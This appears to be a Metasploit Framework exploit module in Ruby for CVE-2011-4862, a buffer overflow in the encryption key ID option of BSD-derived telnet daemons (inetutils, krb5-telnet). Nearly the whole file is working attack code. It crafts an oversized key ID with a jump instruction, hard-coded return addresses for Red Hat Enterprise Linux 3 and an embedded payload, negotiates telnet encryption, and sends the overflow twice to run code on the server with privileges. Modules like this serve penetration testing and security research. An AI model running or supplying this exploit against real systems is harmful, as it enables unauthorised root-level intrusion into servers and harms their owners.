# $Id: $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
 
require &#039;msf/core&#039;
 
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = GreatRanking
     
    include Msf::Exploit::Remote::Telnet
    include Msf::Exploit::BruteTargets
 
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;Linux BSD-derived Telnet Service Encryption Key ID Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{ 
                    This module exploits a buffer overflow in the encryption option handler of the
                Linux BSD-derived telnet service (inetutils or krb5-telnet). Most Linux distributions
                use NetKit-derived telnet daemons, so this flaw only applies to a small subset of
                Linux systems running telnetd.
                },
            &#039;Author&#039;         => [ &#039;Jaime Penalba Estebanez <jpenalbae[at]gmail.com>&#039;, &#039;Brandon Perry <bperry.volatile[at]gmail.com>&#039;, &#039;Dan Rosenberg&#039;, &#039;hdm&#039; ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;References&#039;     =>
                [
                    [&#039;CVE&#039;, &#039;2011-4862&#039;],
                    [&#039;OSVDB&#039;, &#039;78020&#039;],
                    [&#039;BID&#039;, &#039;51182&#039;],
                    [&#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/18280/&#039;]
                ],
            &#039;Privileged&#039;     => true,
            &#039;Platform&#039;       => &#039;linux&#039;,
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;       => 200,
                    &#039;BadChars&#039;    => "\x00",
                    &#039;DisableNops&#039; => true,
                },
  
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;,  { } ],
                    [ &#039;Red Hat Enterprise Linux 3 (krb5-telnet)&#039;, { &#039;Ret&#039; => 0x0804b43c } ],
                ],
            &#039;DefaultTarget&#039;  => 0,
            &#039;DisclosureDate&#039; => &#039;Dec 23 2011&#039;))
    end
 
    def exploit_target(t)
 
        connect
        banner_sanitized = Rex::Text.to_hex_ascii(banner.to_s)
        print_status(banner_sanitized) if datastore[&#039;VERBOSE&#039;]
 
        enc_init      = "\xff\xfa\x26\x00\x01\x01\x12\x13\x14\x15\x16\x17\x18\x19\xff\xf0"
        enc_keyid     = "\xff\xfa\x26\x07"
        end_suboption = "\xff\xf0"
 
        penc = payload.encoded.gsub("\xff", "\xff\xff")
         
        key_id = Rex::Text.rand_text_alphanumeric(400)
 
        key_id[ 0, 2] = "\xeb\x76"
        key_id[72, 4] = [ t[&#039;Ret&#039;] - 20 ].pack("V")
        key_id[76, 4] = [ t[&#039;Ret&#039;] ].pack("V")
 
        # Some of these bytes can get mangled, jump over them
        key_id[80,40]  = "\x41" * 40
 
        # Insert the real payload
        key_id[120, penc.length] = penc
 
        # Create the Key ID command
        sploit = enc_keyid + key_id + end_suboption
 
        # Initiate encryption
        sock.put(enc_init)
 
        # Wait for a successful response
        loop do
            data = sock.get_once(-1, 5) rescue nil
            if not data
                raise RuntimeError, "This system does not support encryption"
            end
            break if data.index("\xff\xfa\x26\x02\x01")
        end
 
        # The first request smashes the pointer
        print_status("Sending first payload")
        sock.put(sploit)
         
        # Make sure the server replied to the first request
        data = sock.get_once(-1, 5)
        unless data
            print_status("Server did not respond to first payload")
            return
        end
 
        # Some delay between each request seems necessary in some cases
        ::IO.select(nil, nil, nil, 0.5)
 
        # The second request results in the pointer being called
        print_status("Sending second payload...")
        sock.put(sploit)
        handler
 
        ::IO.select(nil, nil, nil, 0.5)
        disconnect
    end
 
end



